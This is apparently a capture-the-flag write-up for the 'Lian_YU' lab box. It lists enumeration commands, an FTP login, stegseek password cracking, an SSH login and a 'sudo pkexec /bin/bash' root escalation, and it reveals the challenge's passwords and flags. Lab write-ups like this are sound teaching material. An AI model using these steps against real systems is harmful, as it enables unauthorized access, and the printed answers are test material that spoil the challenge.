Welcome to Lian_YU, this Arrowverse themed beginner CTF box! Capture the flags and have fun.  

Answer the questions below

| Question                                 | Answer           |
| ---------------------------------------- | ---------------- |
| Deploy the VM and Start the Enumeration. | No answer needed |

```
export IP=10.10.23.186
```

```
nmap -sC -sV -v -p- -oN scans/nmap $IP
```

![[Pasted image 20240610130328.png]]

```
gobuster dir --url $IP --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/gobuster.txt
```


![[Pasted image 20240610130555.png]]


```
gobuster dir --url $IP/island/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o scans/gobuster2.txt
```

![[Pasted image 20240611120609.png]]


| Question                             | Answer |
| ------------------------------------ | ------ |
| What is the Web Directory you found? | 2100   |



![[Pasted image 20240611121059.png]]


![[Pasted image 20240611121110.png]]



```
gobuster dir --url $IP/island/2100 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x ticket -o scans/gobuster3.txt
```

![[Pasted image 20240611121919.png]]

![[Pasted image 20240611121952.png]]


| Question                         | Answer             |
| -------------------------------- | ------------------ |
| what is the file name you found? | green_arrow.ticket |

![[Pasted image 20240611122613.png]]



| Question                  | Answer    |
| ------------------------- | --------- |
| what is the FTP Password? | !#th3h00d |


```
ftp 10.10.3.219
```

![[Pasted image 20240611122753.png]]

```
ls -la
```

![[Pasted image 20240611122901.png]]

![[Pasted image 20240611123308.png]]

![[Pasted image 20240611123403.png]]

```
stegseek -sf aa.jpg /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20240611123744.png]]

```
unzip aa.jpg.out
```

![[Pasted image 20240611123931.png]]

```
cat passwd.txt
```

![[Pasted image 20240611124006.png]]

```
cat shado
```

![[Pasted image 20240611124029.png]]


```
ssh slade@10.10.3.219
```

![[Pasted image 20240611124215.png]]


| Question                                 | Answer |
| ---------------------------------------- | ------ |
| what is the file name with SSH password? | shado  |


```
ls -la
```

![[Pasted image 20240611124305.png]]

```
cat user.txt
```

![[Pasted image 20240611124326.png]]

| Question | Answer                                    |
| -------- | ----------------------------------------- |
| user.txt | THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T} |

```
sudo -l
```

![[Pasted image 20240611124435.png]]

```
sudo /usr/bin/pkexec /bin/bash
```

![[Pasted image 20240611124520.png]]

```
ls -la
```

![[Pasted image 20240611124550.png]]


| Question | Answer                                                                                      |
| -------- | ------------------------------------------------------------------------------------------- |
| root.txt | THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D} |
